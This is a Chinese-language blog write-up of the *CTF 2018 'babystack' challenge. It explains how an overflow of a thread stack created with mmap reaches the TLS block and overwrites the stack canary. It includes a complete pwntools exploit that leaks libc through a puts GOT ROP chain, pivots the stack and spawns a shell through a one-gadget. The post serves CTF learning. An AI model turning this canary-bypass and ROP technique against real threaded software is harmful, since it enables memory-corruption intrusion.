---
title: "startCTF 2018 Babystack :thread stack bypass canary"
date: 2018-05-27 13:09:25
tags: pwn
layout: post
---
*CTF 2018 Babystack :thread stack bypass canary

<!--more-->
# *CTF Babystack :thread stack bypass canary
题目:
[链接][1]

0x00：
比赛的时候就感觉很奇怪,啥都没有咋过的canary做不出来，卒
比赛之后看了官方的exp搞了半天居然发现自己连exp都看不懂...
然后幸亏找到了[Sakura师傅的博客][2]
总结起来还是自己太菜了

0x01：准备
[TSL][3]
在创建进程时为了避免全局|静态变量访问冲突，所以需要一个副本
在x86-64 glibc下用mmap创建线程
所以可以通过溢出覆盖掉canary
下面是fs段寄存器的结构
```c
typedef struct
{
  void *tcb;        /* Pointer to the TCB.  Not necessarily the
               thread descriptor used by libpthread.  */
  dtv_t *dtv;
  void *self;       /* Pointer to the thread descriptor.  */
  int multiple_threads;
  int gscope_flag;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  uintptr_t pointer_guard;
  ...
} tcbhead_t;
```
0x02：分析
![](/18-5-27-1.png)
可以看到这里有0x900的溢出
然后我们用gdb调试
在Canary检查前一步下断点，为了算出fs的位移
![](/18-5-27-2.png)
可以通过memsearch来寻找然后计算出相对输入点的偏移
之后就可以通过覆盖来绕过canary
接下来就是泄露，和rop的事情了
0x03：exploit
```python
from pwn import *
binary=ELF('./bs')
libc=binary.libc
context.arch=binary.arch
p=process("./bs")
puts=0x0000000004007C0
size=0x1800
pr=0x0000000000400bc3
puts_got=0x000000000601fb0
main=0x0000000004009E7
leave=0x0000000000400955
pop_rbp=0x0000000000400870
read=0x0000000004007E0
pop_rsi_r15=0x0000000000400bc1
#gdb.attach(p,'b *0x400bc4')
payload="\x00"*(0x1010)+p64(0)+p64(pr)+p64(puts_got)+p64(puts)
payload+=p64(pr)+p64(0)+p64(pop_rsi_r15)+p64(0x00602300)+p64(0)+p64(read)
payload+=p64(pop_rbp)+p64(0x00602300-8)+p64(leave)
payload=payload.ljust(0x1800,'\x00')
p.sendlineafter("send?",str(size))
sleep(0.2)
p.send(payload)
context.log_level='debug'
p.readuntil("goodbye.\n")
base=u64(p.read(6).ljust(8,'\x00'))-libc.symbols['puts']
libc.address=base
p2=p64(pr)+p64(libc.search("/bin/sh").next())+p64(libc.symbols['system'])
p2=p64(0xf02a4+base)
p.send(p2)
p.interactive()
```
0x03:
还是太菜了
见识短，练的题目又少

  [1]: https://github.com/sixstars/starctf2018
  [2]: http://eternalsakura13.com/2018/04/24/starctf_babystack/
  [3]: http://www.openwall.com/lists/oss-security/2018/02/27/5